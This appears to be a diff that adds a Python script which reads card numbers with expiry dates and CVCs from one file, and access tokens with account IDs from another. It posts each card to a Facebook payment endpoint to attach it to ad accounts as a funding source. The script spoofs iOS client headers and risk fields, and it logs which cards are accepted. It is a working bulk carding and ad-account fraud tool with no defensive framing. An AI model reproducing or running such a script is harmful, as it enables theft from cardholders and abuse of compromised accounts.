@@ -1,0 +1,57 @@
+import requests
+
+
+def add_cc(access_token, user_id, account_id, v):
+    with open("visa.txt", "r") as f:
+        card = f.read().split("\n")
+        card = card[v]
+
+    data = {
+        'make_ads_primaty_funding_source': ['1'],
+        'app_version': ['22916291'],
+        'payment_type': ['ads_invoice'],
+        'locale': ['ru_RU'],
+        'billing_address': ['{"country_code":"RU"}'],
+        'sdk': ['ios'], 'sdk_version': ['3'],
+        'risk_features': ['{"CreditCardFormType":"mobile","MobilePlatform":"iOS"}'],
+        'pretty': ['0'],
+        'creditCardNumber': [card.split(":")[0]],
+        'expiry_year': [card.split(":")[2]],
+        'expiry_month': [card.split(":")[1]],
+        'csc': [card.split(":")[3]],
+        'account_id': [account_id],
+        'format': ['json'],
+        'fb_api_req_friendly_name': ['add_credit_card'],
+        'fb_api_caller_class': ['com.facebook.payments.common.PaymentNetworkOperationHelper']
+    }
+
+    headers = {
+        'Authorization': 'OAuth ' + access_token,
+        'X-Fb-Connection-Type': 'wifi',
+        'X-Fb-Sim-Hni': '25001',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Encoding': 'gzip, deflate',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A356 Safari/604.1'
+    }
+
+    r = requests.post("https://graph.secure.facebook.com/ajax/payment/token_proxy.php?tpe=/" + user_id + "/creditcards",
+                      headers=headers, data=data)
+
+    print(r.text)
+    if 'id' in r.json():
+        print("1:" + card)
+    else:
+        print("0:" + card)
+
+
+if __name__ == '__main__':
+    with open("accss.txt", "r") as f:
+        lines = f.read().split("\n")
+
+    v = 0
+    for account in lines:
+        try:
+            add_cc(account.split(":")[0], account.split(":")[1], account.split(":")[2], v)
+            v = v + 1
+        except Exception as e:
+            print(repr(e))
